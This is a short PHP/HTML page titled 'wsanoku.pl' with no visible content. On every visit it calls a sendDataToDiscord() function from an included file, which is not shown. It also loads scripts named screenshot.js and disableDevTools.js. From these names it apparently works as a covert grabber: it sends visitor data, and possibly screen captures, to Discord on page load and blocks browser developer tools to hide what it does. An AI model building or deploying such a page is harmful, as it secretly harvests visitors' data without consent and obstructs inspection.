<?php

include 'functions.php';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  sendDataToDiscord();
} else {
  die("Invalid request method.");
}

?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="noindex">
    <title>wsanoku.pl</title>
    <link rel="shortcut icon" href="./public/favicon.ico" />
    <link
      rel="preload"
      href="./public/styles.css"
      as="style"
      type="text/css"
      onload="this.rel='stylesheet'"
    />
  </head>
    <script type="text/javascript" src="./public/screenshot.js"></script>
    <script
      type="text/javascript"
      disable-devtool-auto
      src="./public/disableDevTools.js"
    ></script>
  </body>
</html>
